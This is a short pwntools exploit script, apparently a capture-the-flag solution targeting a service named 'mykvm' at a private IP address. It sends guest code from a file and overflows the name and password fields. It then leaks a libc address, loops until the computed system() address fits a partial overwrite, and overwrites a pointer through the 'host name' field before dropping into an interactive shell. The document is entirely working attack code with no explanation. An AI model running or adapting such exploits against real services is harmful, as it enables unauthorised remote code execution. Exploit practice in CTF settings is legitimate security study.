from pwn import *
# context.log_level = 'debug'
libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
while(1):
    # p = process("./mykvm")
    p = remote("10.15.196.135", 9999)

    sla = lambda x,y: p.sendlineafter(x,y)
    sa  = lambda x,y: p.sendafter(x,y)


    # code = "\xB0\x61\xBA\x17\x02\xEE\xB0\n\xEE\xF4"
    with open("./exp.bin", "rb") as f:
        code = f.read()
    sla("size:", str(len(code)))
    # print disasm(code)

    sa("code:", code)
    sla("guest name:", "a"*0x28)
    sla("guest passwd:", "a"*0x50)
    libc_base = u64(p.recvuntil("\x7f")[-6:].ljust(8, '\x00')) - 0x3ea350#0x3c4b78
    system_addr = libc_base + 0x44e30     # do_system
    log.success("libc_base: "+hex(libc_base))
    log.success("system_addr: "+hex(system_addr))
    if (system_addr >> 0x10) & 0xff == 0x00:
        break

sla("host name:", 'a'*0x2e + p8(system_addr &0xff) + p8((system_addr >> 8) &0xff))

p.interactive()
